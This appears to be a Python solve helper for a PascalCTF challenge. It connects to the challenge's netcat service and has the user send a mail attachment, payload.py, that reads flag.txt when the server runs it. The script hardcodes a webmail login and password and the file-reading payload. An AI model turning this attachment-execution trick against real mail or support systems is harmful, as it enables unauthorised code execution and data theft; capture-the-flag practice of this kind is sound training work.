#!/usr/bin/env python3
"""
SurgoCompany CTF - Manual solve helper

1. Run this script
2. Open Roundcube webmail: https://surgo.ctf.pascalctf.it
3. Login with your credentials
4. Reply to the support email with payload.py attached
5. Watch for flag output here
"""

import socket
import re

NC_HOST = "surgobot.ctf.pascalctf.it"
NC_PORT = 6005

USERNAME = "user-w2xxn2xy@skillissue.it"

def main():
    print(f"\n[*] Using email: {USERNAME}")

    # Step 1: Connect to the nc service
    print(f"\n[*] Connecting to {NC_HOST}:{NC_PORT}...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(180)
    sock.connect((NC_HOST, NC_PORT))

    # Receive banner
    data = b""
    while b"Enter your email address:" not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
        print(chunk.decode(), end='')

    # Send email
    sock.sendall((USERNAME + "\n").encode())
    print(f"\n[+] Sent email: {USERNAME}")

    print("\n" + "="*60)
    print("NOW DO THE FOLLOWING:")
    print("1. Open: https://surgo.ctf.pascalctf.it")
    print(f"2. Login with: {USERNAME} / Xe78kRTwcxgEuzIU")
    print("3. Find the support email and REPLY to it")
    print("4. ATTACH the file: solve/payload.py")
    print("   (Content: print(open('flag.txt').read()) )")
    print("5. Send the reply")
    print("="*60)

    # Wait for output
    print("\n[*] Waiting for server response...")
    sock.settimeout(180)

    try:
        output = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                output += chunk
                decoded = chunk.decode(errors='replace')
                print(decoded, end='', flush=True)

                # Check for flag
                if b"PascalCTF{" in output:
                    break
                if b"goodbye" in output.lower():
                    break
            except socket.timeout:
                print("\n[!] Timeout waiting for response")
                break

        output_str = output.decode(errors='replace')
        print("\n" + "="*60)

        # Extract flag
        flag_match = re.search(r'PascalCTF\{[^}]+\}', output_str)
        if flag_match:
            print(f"\n[+] FLAG FOUND: {flag_match.group()}")
            return flag_match.group()

    except Exception as e:
        print(f"\n[-] Error: {e}")
    finally:
        sock.close()

    return None


if __name__ == "__main__":
    main()
